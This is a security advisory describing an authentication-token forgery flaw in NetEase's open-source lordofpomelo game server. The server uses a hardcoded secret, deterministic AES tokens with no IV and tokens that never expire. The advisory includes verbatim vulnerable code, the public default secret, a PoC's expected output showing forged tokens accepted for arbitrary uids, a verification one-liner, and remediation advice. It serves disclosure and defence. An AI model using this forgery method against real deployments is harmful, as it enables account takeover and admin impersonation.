# LordOfTokens — NetEase lordofpomelo auth-token forgery (account takeover)

A wildcard-track finding: the **authentication token service** in NetEase's
open-source game-server framework [**lordofpomelo**](https://github.com/NetEase/lordofpomelo)
encrypts session tokens with a **hardcoded default secret**, using Node's
**deprecated `crypto.createCipher` (no IV)**, producing **unauthenticated,
deterministic AES-256-CBC** tokens that **never expire**. Any unauthenticated
attacker can forge a valid token for *any* user id — including the admin.

---

## Product & version

| Field | Value |
| --- | --- |
| Product | NetEase **lordofpomelo** (open-source MMORPG / Pomelo reference game server) |
| Repo | https://github.com/NetEase/lordofpomelo |
| Version | `master` @ `5e12f10a86534e4072396737cc4feacef42d43d7` (latest, 2017-02-17) |
| Language | Node.js (CoffeeScript game logic; the token service is plain JS) |
| Prominence | NetEase's canonical Pomelo example game (~800★), a widely-used template for Pomelo-based game/real-time servers |

## Severity

| Field | Value |
| --- | --- |
| CVSS 3.1 | **9.8 Critical** (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | CWE-798 (Hard-coded Credentials), CWE-327 (Broken/Risky Crypto), CWE-330 (Insufficiently Random Values — fixed IV), CWE-347 (Improper Verification of Cryptographic Signature — no MAC), CWE-613 (Insufficient Session Expiration) |

## Root cause

The web server authenticates users and mints a session token:

```js
// web-server/app.js
app.post('/login', function(req, res) {
  ...
  res.send({code: 200, token: Token.create(user.id, Date.now(), secret), uid: user.id});
});
```

`Token.create` is:

```js
// shared/token.js  (VERBATIM)
module.exports.create = function(uid, timestamp, pwd) {
  var msg = uid + '|' + timestamp;
  var cipher = crypto.createCipher('aes256', pwd);   // <-- deprecated, NO IV
  var enc = cipher.update(msg, 'utf8', 'hex');
  enc += cipher.final('hex');
  return enc;
};
```

…and `pwd` is the framework's **hardcoded default session secret**, shipped
verbatim in the repo config *and* as the fallback inside the auth service:

```js
// game-server/app/servers/auth/remote/authRemote.js  (VERBATIM)
var DEFAULT_SECRET = 'pomelo_session_secret';
...
this.secret = session.secret || DEFAULT_SECRET;
```

```json
// shared/config/session.json  AND  game-server/config/session.json
{ "secret": "pomelo_session_secret", "expire": -1 }
```

The game-server validates the token in `authRemote.auth`:

```js
// game-server/app/servers/auth/remote/authRemote.js  (VERBATIM)
pro.auth = function(token, cb) {
  var res = tokenService.parse(token, this.secret);
  if(!res) { cb(null, Code.ENTRY.FA_TOKEN_ILLEGAL); return; }
  if(!checkExpire(res, this.expire)) { cb(null, Code.ENTRY.FA_TOKEN_EXPIRE); return; }
  userDao.getUserById(res.uid, function(err, user) { ... cb(null, Code.OK, user); });
};
```

`getUserById` performs `SELECT * FROM User WHERE id = ?`, so the token's `uid`
maps directly to a database account (`uid = 1` is the first/admin account).

### Why it breaks

1. **Hardcoded credential (CWE-798)** — the AES password is a public string
   (`'pomelo_session_secret'`) baked into the repo config and the auth service's
   fallback. Anyone who reads the source knows the key.
2. **`createCipher` with no IV (CWE-327/330)** — Node's deprecated
   `crypto.createCipher(algo, password)` derives *both* key **and** IV from the
   password via `EVP_BytesToKey` (MD5, single iteration, **no salt**). The IV is
   therefore **fixed** for a given secret, making encryption fully deterministic
   (same `uid|timestamp` → same token, always).
3. **No authentication tag (CWE-347)** — the token is raw AES-CBC with no HMAC/GCM;
   integrity is never verified (moot once the key is public, but a defense-in-depth
   failure regardless).
4. **Never expires (CWE-613)** — the shipped config sets `"expire": -1`, so forged
   tokens remain valid indefinitely.

## Vulnerable code (permalinks)

- [`shared/token.js`](https://github.com/NetEase/lordofpomelo/blob/5e12f10a86534e4072396737cc4feacef42d43d7/shared/token.js) — `crypto.createCipher('aes256', pwd)`
- [`game-server/app/servers/auth/remote/authRemote.js`](https://github.com/NetEase/lordofpomelo/blob/5e12f10a86534e4072396737cc4feacef42d43d7/game-server/app/servers/auth/remote/authRemote.js) — `DEFAULT_SECRET = 'pomelo_session_secret'`
- [`shared/config/session.json`](https://github.com/NetEase/lordofpomelo/blob/5e12f10a86534e4072396737cc4feacef42d43d7/shared/config/session.json) — `"secret": "pomelo_session_secret", "expire": -1`
- [`game-server/config/session.json`](https://github.com/NetEase/lordofpomelo/blob/5e12f10a86534e4072396737cc4feacef42d43d7/game-server/config/session.json) — same
- [`web-server/app.js`](https://github.com/NetEase/lordofpomelo/blob/5e12f10a86534e4072396737cc4feacef42d43d7/web-server/app.js) — `Token.create(user.id, Date.now(), secret)`

## PoC

### Run

```bash
node forge.js
```

No dependencies, no network. The PoC vendors the exact upstream `token.create` /
`token.parse` and `authRemote.auth` accept-path logic (marked `VERBATIM`).

### Expected output

```
[+] Hardcoded token secret (public, in repo config): "pomelo_session_secret"
[+] Session expiry from shipped config: -1 (negative = never expire)

    forge token for uid=1      -> 5e5cf71a8ddb2eb7a1c1b92ae8672529   server verdict: AUTHENTICATED as uid=1
    forge token for uid=2      -> d20d9f30d91ad2695b7cb59f19745446   server verdict: AUTHENTICATED as uid=2
    forge token for uid=7      -> d1e3ae441d1026939c70b5c740c1b664   server verdict: AUTHENTICATED as uid=7
    forge token for uid=31337  -> b25897b13a0cdee6fd4164e32e1dabba8... server verdict: AUTHENTICATED as uid=31337

[+] Demo of the underlying crypto weaknesses:
    determinism:  token("1|1700000000000") == token("1|1700000000000") ? true
    fixed IV:     ...
    no MAC:       ciphertext is raw AES-CBC, no HMAC/GCM tag is ever checked
    format:       token plaintext is "<uid>|<timestamp>" — uid is a small auto-increment int
```

Every forged token is accepted as a real login for the corresponding uid.

### Verify against the real code

```bash
git clone --depth 1 https://github.com/NetEase/lordofpomelo.git
node -e 'const t=require("./lordofpomelo/shared/token");
         const s="pomelo_session_secret";
         console.log(t.parse(t.create("1", Date.now(), s), s));'
# -> { uid: "1", timestamp: <...> }   (auth bypass confirmed on upstream source)
```

## Threat model (honest)

- **Confirmed & demonstrable:** with the *default* config, the token key is public,
  so any unauthenticated remote attacker who knows the (open-source) code can mint
  tokens for arbitrary uids → full account takeover / admin impersonation.
- **Bounded by configuration:** the forge *requires* the secret to still be the
  shipped default `'pomelo_session_secret'`. A deployment that explicitly overrides
  `app.set('session', { secret: <random>, expire: ... })` in every server is not
  directly forgeable via the hardcoded key. (The `expire` default in
  `authRemote.js` is 6h, but the *shipped* `session.json` sets it to `-1`.)
- **Residual crypto weaknesses apply regardless of the secret:** even with a custom
  secret, the token is (a) AES-CBC with **no IV** and a **fixed** key/IV derived by
  `EVP_BytesToKey` (MD5, unsalted), and (b) **unauthenticated** (no MAC). These make
  the scheme determinism-prone and ciphertext-malleable, and leave password-derived
  keys wide open to offline dictionary attack (single MD5 round, no salt).
- This is a 2017-era example framework; the realistic downstream population is
  developers who forked it as a Pomelo template without auditing the token service.

## Remediation

1. **Never hardcode the token secret.** Require `app.set('session', { secret })` and
   fail-fast if it is missing or equals a known default. Generate it from a CSPRNG
   (`crypto.randomBytes(32)`).
2. **Stop using `crypto.createCipher`.** Use `crypto.createCipheriv('aes-256-gcm',
   key, iv)` with a fresh random 12-byte IV/nonce per token, and store the IV + GCM
   auth tag alongside the ciphertext (authenticated encryption).
3. **Derive keys with a strong KDF** (scrypt/argon2 or PBKDF2 ≥ 310k rounds) with a
   random salt — or better, use a random 256-bit key, not a password, for the token.
4. **Enforce a bounded expiry** and make it non-negative; validate the timestamp
   server-side against a short-lived window.
5. Optionally switch to a standard **signed** token (HMAC-SHA256 JWT) instead of
   symmetric encryption of a uid.

## Disclosure notes

- No formal CVE has been assigned; this is a new report against the default-config
  path of lordofpomelo. The project is unmaintained (last commit 2017); the finding
  is documented here as a public PoC with honest scope.
